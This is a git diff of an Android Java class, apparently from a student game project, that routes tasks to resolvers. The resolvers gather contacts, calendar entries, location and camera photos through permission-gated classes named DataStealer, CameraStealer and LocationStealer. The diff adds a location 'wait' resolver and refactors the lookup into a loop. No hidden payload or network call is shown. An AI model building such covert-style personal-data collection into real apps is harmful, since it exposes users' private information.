@@ -2,8 +2,12 @@ package de.hpi3d.gamepgrog.trap.tasks;
 
 import android.Manifest;
 
+import java.util.Arrays;
+import java.util.List;
+
 import de.hpi3d.gamepgrog.trap.android.CameraStealer;
 import de.hpi3d.gamepgrog.trap.android.DataStealer;
+import de.hpi3d.gamepgrog.trap.android.LocationStealer;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 import de.hpi3d.gamepgrog.trap.datatypes.Language;
@@ -37,7 +41,7 @@ public class TaskResolverManager {
                     new String[] {
                             Manifest.permission.ACCESS_COARSE_LOCATION,
                             Manifest.permission.ACCESS_FINE_LOCATION},
-                    DataStealer::takeLocationData);
+                    LocationStealer::takeSingleLocationData);
 
     private final static ImageTaskResolver imageTaskResolver =
             new ImageTaskResolver(
@@ -45,12 +49,29 @@ public class TaskResolverManager {
                     new String[] {Manifest.permission.CAMERA},
                     CameraStealer::takeUserImage);
 
+    private final static SyncTaskResolver<LocationData> waitTaskResolver =
+            new SyncTaskResolver<>(
+                    "wait",
+                    "location",
+                    new String[]{
+                            Manifest.permission.ACCESS_COARSE_LOCATION,
+                            Manifest.permission.ACCESS_FINE_LOCATION},
+                    LocationStealer::getStealResult);
+
     public static TaskResolver<? extends UserData> getResolverFor(Task task) {
-        if (contactTaskResolver.applicableFor(task)) return contactTaskResolver;
-        else if (calendarTaskResolver.applicableFor(task)) return calendarTaskResolver;
-        else if (languageResolver.applicableFor(task)) return languageResolver;
-        else if (locationTaskResolver.applicableFor(task)) return locationTaskResolver;
-        else if (imageTaskResolver.applicableFor(task)) return imageTaskResolver;
+        List<TaskResolver> resolvers = Arrays.asList(
+                contactTaskResolver,
+                calendarTaskResolver,
+                languageResolver,
+                locationTaskResolver,
+                imageTaskResolver,
+                waitTaskResolver);
+
+        for (TaskResolver resolver : resolvers) {
+            if (resolver.applicableFor(task)) {
+                return resolver;
+            }
+        }
         throw new UnsupportedOperationException("There is no Resolver for a task with datatype: "
                 + task.getDatatype());
     }
